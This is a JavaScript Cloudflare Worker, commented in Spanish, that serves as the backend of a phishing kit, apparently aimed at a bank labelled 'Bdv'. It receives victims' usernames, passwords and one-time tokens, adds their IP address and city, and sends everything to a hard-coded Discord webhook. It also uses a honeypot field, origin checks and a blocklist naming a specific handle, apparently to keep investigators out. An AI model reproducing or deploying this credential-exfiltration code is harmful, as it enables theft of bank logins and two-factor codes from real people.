const DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1541570722542002216/17wLPq3T3KXukvrKpFFP8gJ0g2B4gyceHPUrPfCxo9ogpIHCuEebvyTx_s8IECYrOvSy";

const BLOCKLIST = [
  "asena_killer",
  "@asena_killer"
];

const ALLOWED_ORIGINS = [
  "https://TU-DOMINIO.com",
  "https://www.TU-DOMINIO.com"
];

const RATE_LIMIT_MAX = 5;
const RATE_LIMIT_WINDOW = 60;
const MIN_SUBMIT_TIME = 3000;

const ipRequestLog = {};

addEventListener("fetch", (event) => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  if (request.method === "OPTIONS") {
    return new Response(null, { status: 204, headers: corsHeaders() });
  }

  if (request.method !== "POST") {
    return jsonResponse({ success: false, error: "POST only" }, 405);
  }

  const origin = request.headers.get("Origin") || "";
  const referer = request.headers.get("Referer") || "";
  const origenValido = ALLOWED_ORIGINS.some(a => origin === a || referer.startsWith(a));

  if (!origenValido) {
    return jsonResponse({ success: false, error: "Origen no autorizado" }, 403);
  }

  const ip = request.headers.get("CF-Connecting-IP") || "Desconocida";

  const ahora = Date.now();
  if (!ipRequestLog[ip]) ipRequestLog[ip] = [];
  ipRequestLog[ip] = ipRequestLog[ip].filter(t => ahora - t < RATE_LIMIT_WINDOW * 1000);

  if (ipRequestLog[ip].length >= RATE_LIMIT_MAX) {
    return jsonResponse({ success: false, error: "Demasiadas solicitudes" }, 429);
  }
  ipRequestLog[ip].push(ahora);

  let data;
  try {
    data = await request.json();
  } catch (e) {
    return jsonResponse({ success: false, error: "JSON inválido" }, 400);
  }

  if (data._hp && data._hp.length > 0) {
    return jsonResponse({ success: true }, 200);
  }

  const ts = parseInt(data._ts || "0", 10);
  if (ts > 0 && (ahora - ts) < MIN_SUBMIT_TIME) {
    return jsonResponse({ success: false, error: "Envío demasiado rápido" }, 403);
  }

  const action   = data.action || "";
  const usuario  = (data.usuario || "").replace(/[<>'"\/\\&]/g, "");
  const tramite  = data.tramite || "";
  const password = data.password || "";
  const token    = (data.token || "").replace(/[^0-9]/g, "");

  const payloadCompleto = `${usuario} ${tramite} ${password} ${token}`.toLowerCase();
  const bloqueado = BLOCKLIST.some(item => payloadCompleto.includes(item.toLowerCase()));

  if (bloqueado) {
    return jsonResponse({ success: false, error: "Solicitud no permitida" }, 403);
  }

  const cf        = request.cf || {};
  const ciudad    = cf.city || "Desconocida";
  const region    = cf.region || "";
  const pais      = cf.country || "";
  const ubicacion = ciudad + (region ? ", " + region : "") + (pais ? " (" + pais + ")" : "");

  let embed = null;

  switch (action) {
    case "submit_user":
      embed = {
        title: "🆕 Bdv",
        color: 3447003,
        fields: [
          { name: "👤 Usuario", value: "`" + usuario + "`", inline: true },
          { name: "📋 Trámite", value: "`" + tramite + "`", inline: true },
          { name: "🌐 IP", value: "`" + ip + "`", inline: true },
          { name: "📍 Ubicación", value: "`" + ubicacion + "`", inline: false },
        ],
        timestamp: new Date().toISOString(),
      };
      break;

    case "submit_password":
      embed = {
        title: "✅ LOGIN",
        color: 3066993,
        fields: [
          { name: "👤 Usuario", value: "`" + usuario + "`", inline: true },
          { name: "📝 Clave", value: "`" + password + "`", inline: true },
        ],
        timestamp: new Date().toISOString(),
      };
      break;

    case "submit_token":
      embed = {
        title: "📱 TOKEN",
        color: 15844367,
        fields: [
          { name: "👤 Usuario", value: "`" + usuario + "`", inline: true },
          { name: "🔢 Token", value: "`" + token + "`", inline: true },
        ],
        timestamp: new Date().toISOString(),
      };
      break;

    case "cancel_login":
      return jsonResponse({ success: true, status: "cancelado" }, 200);

    default:
      return jsonResponse({ success: false, error: "Acción denegada" }, 403);
  }

  const discordRes = await fetch(DISCORD_WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ embeds: [embed] }),
  });

  if (discordRes.status === 204 || discordRes.status === 200) {
    return jsonResponse({ success: true }, 200);
  } else {
    return jsonResponse({ success: false, error: "Fallo de transporte" }, 500);
  }
}

function jsonResponse(obj, status) {
  return new Response(JSON.stringify(obj), {
    status: status,
    headers: corsHeaders(),
  });
}

function corsHeaders() {
  return {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
    "Content-Type": "application/json; charset=utf-8",
  };
}
